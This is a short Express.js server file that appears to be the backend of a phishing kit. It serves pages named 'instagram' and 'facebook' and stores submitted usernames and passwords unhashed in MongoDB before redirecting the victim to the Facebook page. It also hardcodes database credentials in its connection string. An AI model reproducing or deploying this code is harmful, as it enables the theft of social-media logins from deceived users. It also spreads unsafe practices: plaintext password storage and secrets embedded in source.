var express               = require("express"),
    mongoose              = require("mongoose"),

    bodyParser            = require("body-parser"),
    User                  = require("./models/user"),

	methodOverride  = require("method-override")


var flash = require("connect-flash");




mongoose.connect("mongodb+srv://Audumber123:Audumber123@cluster0.oqh1p.mongodb.net/vishnu?retryWrites=true&w=majority");


var app = express();
app.use(methodOverride("_method"));//using method-override + what to look for in url *the parentheses as above*

app.use(flash())
app.set("view engine", "ejs");
app.use(express.static(__dirname + "/public"));
app.use(bodyParser.urlencoded({extended: true})); //required for forms that post data via request


app.use(express.static("public"));
// code to set up passport to work in our app -> THESE TWO cdMETHODS/LINES ARE REQUIRED EVERY TIME








//show sign up form
app.get("/instagram", function(req, res){
    res.render("instagram");
});

app.get("/facebook", function(req, res){
    res.render("facebook");
});

//handling user sign up
app.post("/register", function(req, res){
    req.body.username;
    req.body.password

console.log("hii audumber")

	// var today = new Date();
	// var date = today.getDate()+'/'+(today.getMonth()+1)+'/'+today.getFullYear();
	// var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
	// var dateTime = date+' '+time;


    User.create({username: req.body.username  , password:req.body.password }, function (err, user){
		console.log("reached here")
        if(err) {

            res.redirect("/register");
        } else{
			res.redirect("/facebook");
		}


    }) 



});




app.listen(3000,function(err){
	if(err){
		console.log("server connection error!!")
		console.log("Reconnecting . . . ")
	}else{
		console.log("connecting . . . ")
		console.log("connected successfully")
	}
})



// app.listen(process.env.PORT, process.env.IP, function(){
//     console.log("server started...")
// });
